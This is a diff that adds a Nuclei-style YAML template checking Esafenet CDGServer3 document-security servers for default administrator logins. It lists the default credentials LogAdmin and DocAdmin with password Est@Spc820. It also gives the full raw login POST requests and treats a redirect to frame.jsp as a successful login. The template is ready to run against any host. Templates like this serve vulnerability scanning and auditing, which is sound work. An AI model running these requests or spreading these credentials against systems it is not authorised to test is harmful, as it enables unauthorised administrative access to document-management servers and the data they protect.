@@ -1,0 +1,50 @@
+id: esafenet-cdgserver3-default-login
+info:
+  name: 亿赛通-电子文档安全管理系统-前台默认密码
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E4%BA%BF%E8%B5%9B%E9%80%9A-default-password.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: LogAdmin/Est@Spc820;DocAdmin/Est@Spc820
+  tags: esafenet,default-login
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/logincontroller HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID=85A35FC540667402636FD5A8B827851B;
+
+        command=Login&forward=frame.jsp&csrfmiddlewaretoken=1739165355238&name=LogAdmin&mima=l3sR9FHlwxCv53Xh%2BRmzVQ%3D%3D
+
+    matchers:
+      - type: dsl
+        name: LogAdmin
+        dsl:
+          - status_code == 302
+          - contains_all(header,'frame.jsp')
+        condition: and
+
+  - raw:
+      - |+
+        POST /CDGServer3/logincontroller HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID=85A35FC540667402636FD5A8B827851B;
+        
+        command=Login&forward=frame.jsp&csrfmiddlewaretoken=1739165355238&name=DocAdmin&mima=l3sR9FHlwxCv53Xh%2BRmzVQ%3D%3D
+
+    matchers:
+      - type: dsl
+        name: DocAdmin
+        dsl:
+          - status_code == 302
+          - contains_all(header,'frame.jsp')
+        condition: and
